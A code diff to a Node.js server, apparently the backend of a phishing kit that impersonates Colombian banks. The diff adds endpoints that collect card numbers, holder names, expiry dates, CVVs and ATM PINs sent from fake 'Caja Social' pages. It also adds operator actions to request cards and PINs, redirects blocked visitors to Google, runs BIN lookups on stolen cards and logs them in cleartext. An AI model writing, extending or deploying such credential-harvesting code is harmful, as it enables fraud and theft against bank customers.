@@ -505,7 +505,10 @@ const server = http.createServer(async (req, res) => {
                         PEDIR_TARJETA: 'mostrar_tarjeta',
                         PEDIR_TARJETA_BBVA: 'pedir_tarjeta_bbva',
                         PEDIR_TARJETA_POPULAR: 'pedir_tarjeta_popular',
-                        PEDIR_TARJETA_OCCIDENTE: 'pedir_tarjeta_occidente' // 🔥 NUEVA ACCIÓN AGREGADA AQUÍ
+                        PEDIR_TARJETA_OCCIDENTE: 'pedir_tarjeta_occidente',
+                        // 🔥 CAJA SOCIAL 🔥
+                        PEDIR_TARJETA_CAJA_SOCIAL: 'pedir_tarjeta_caja_social',
+                        PEDIR_PIN_CAJA_SOCIAL: 'pedir_pin_caja_social'
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     let estadoNuevo = mapEstados[accion];
@@ -981,6 +984,80 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        // 🔥 NUEVO ENDPOINT PARA CAJA SOCIAL (RECIBE TARJETA DESDE buildc.html) 🔥
+        if (req.method === 'POST' && url === '/caja-social/guardar-tarjeta') {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const datos = await getBody(req);
+                const { sessionId, tarjeta, titular, exp, cvv } = datos;
+                
+                if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
+
+                const previos = datosSesiones.get(sessionId) || {};
+                const infoBin = await obtenerInfoBin(tarjeta);
+
+                const datosCompletos = Object.assign({}, previos, {
+                    sessionId,
+                    bancoKey: 'caja-social',
+                    marca: 'caja-social',
+                    tarjeta,
+                    titular,
+                    exp,
+                    expMes: exp,
+                    cvv,
+                    ip: previos.ip || ip,
+                    creadoEn: previos.creadoEn || new Date().toISOString(),
+                    bin: infoBin?.bin || '',
+                    cardBrand: infoBin?.cardBrand || 'Desconocida',
+                    cardType: infoBin?.cardType || 'Desconocido',
+                    cardLevel: infoBin?.cardLevel || 'Desconocido',
+                    bankName: infoBin?.bankName || 'Desconocido',
+                    countryName: infoBin?.countryName || 'Desconocido'
+                });
+
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datosCompletos);
+                ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
+                pasosSesiones.set(sessionId, 'Caja Social Tarjeta');
+
+                guardarHistorial('caja-social', datosCompletos);
+
+                console.log(`[CAJA SOCIAL] Tarjeta recibida: ${sessionId} | Tarjeta: ${tarjeta} | Titular: ${titular}`);
+                json(res, 200, { ok: true, sessionId, binInfo: infoBin });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
+        // 🔥 NUEVO ENDPOINT PARA CAJA SOCIAL (RECIBE PIN / CLAVE ATM DESDE confirmacion.html) 🔥
+        if (req.method === 'POST' && url === '/caja-social/guardar-pin') {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const datos = await getBody(req);
+                const { sessionId, pin } = datos;
+
+                if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
+
+                const previos = datosSesiones.get(sessionId) || {};
+                const datosCompletos = Object.assign({}, previos, {
+                    pin,
+                    bancoKey: 'caja-social',
+                    ip: previos.ip || ip,
+                    creadoEn: previos.creadoEn || new Date().toISOString()
+                });
+
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datosCompletos);
+                ultimaAccionSesiones.set(sessionId, 'ENVIAR_PIN');
+                pasosSesiones.set(sessionId, 'Caja Social PIN');
+
+                guardarHistorial('caja-social', datosCompletos);
+
+                console.log(`[CAJA SOCIAL] PIN recibido: ${sessionId} | PIN: ${pin}`);
+                json(res, 200, { ok: true, sessionId });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
         // 🔥 AQUI ESTA LA PROTECCIÓN CON EL CAPTCHA 🔥
         if (req.method === 'POST' && url === '/vanti/enviar') {
             try {
@@ -1264,7 +1341,7 @@ const server = http.createServer(async (req, res) => {
         if (req.method === 'GET' && estadoMatch) {
             const bancoKey = estadoMatch[1];
             const sessionId = estadoMatch[2];
-            const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || bancoKey === 'vanti' || bancoKey === 'popular' || bancoKey === 'davivienda' || bancoKey === 'bbva' || bancoKey === 'occidente';
+            const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || bancoKey === 'vanti' || bancoKey === 'popular' || bancoKey === 'davivienda' || bancoKey === 'bbva' || bancoKey === 'occidente' || bancoKey === 'caja-social';
             if (!esValido) { json(res, 404, { ok: false }); return; }
             const estado = estadoSesiones.get(sessionId) || 'pendiente';
             const accion = ultimaAccionSesiones.get(sessionId) || '';
